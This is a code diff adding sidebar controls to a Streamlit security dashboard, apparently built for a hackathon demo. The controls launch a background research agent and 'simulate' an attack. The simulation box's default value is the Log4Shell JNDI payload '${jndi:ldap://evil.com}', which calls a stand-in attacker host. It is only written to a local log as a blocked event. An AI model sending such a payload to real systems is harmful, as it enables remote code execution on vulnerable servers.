@@ -3,6 +3,7 @@ import streamlit as st
 import pandas as pd
 import json
 import time
+import sys
 import altair as alt
 from datetime import datetime
 
@@ -81,6 +82,31 @@ with st.sidebar:
     if st.button("CLEAR MISSION LOGS", type="primary"):
         open("mission_log.jsonl", "w").close()
         st.toast("Mission Logs Purged", icon="🗑️")
+
+    st.markdown("### 🎮 INTERACTIVE DEMO")
+    target_research = st.text_input("Deep Research Target", "Log4Shell")
+    if st.button("LAUNCH RESEARCH AGENT"):
+        import subprocess
+        # Run CLI research command in background
+        subprocess.Popen([sys.executable, "src/cli.py", "research", target_research])
+        st.toast(f"Agent dispatched for {target_research}", icon="🚀")
+        
+    st.markdown("### 💥 SIMULATE ATTACK")
+    attack_payload = st.text_area("Attack Payload", "${jndi:ldap://evil.com}")
+    if st.button("SEND MALICIOUS REQUEST"):
+        # Simulate an attack log entry for demo purposes (since we can't easily hit the gateway from Streamlit Cloud without public URL)
+        # In a real deployed version, this would hit the Gateway URL. 
+        # For the hackathon demo, we will append to log to show VISUALIZATION.
+        entry = {
+            "timestamp": datetime.now().strftime("%H:%M:%S"),
+            "decision": "BLOCK",
+            "trace": f"Simulated detection of {attack_payload[:20]}...",
+            "reasoning": "Gemini Thinking: Payload matches known RCE signature. Context Cache confirms critical vulnerability. Action: Block & Sign.",
+            "_time": str(datetime.now())
+        }
+        with open("mission_log.jsonl", "a") as f:
+            f.write(json.dumps(entry) + "\n")
+        st.toast("Attack Injected into Hive Mind", icon="⚠️")
 
 # --- MAIN HEADER ---
 col_head1, col_head2 = st.columns([3, 1])
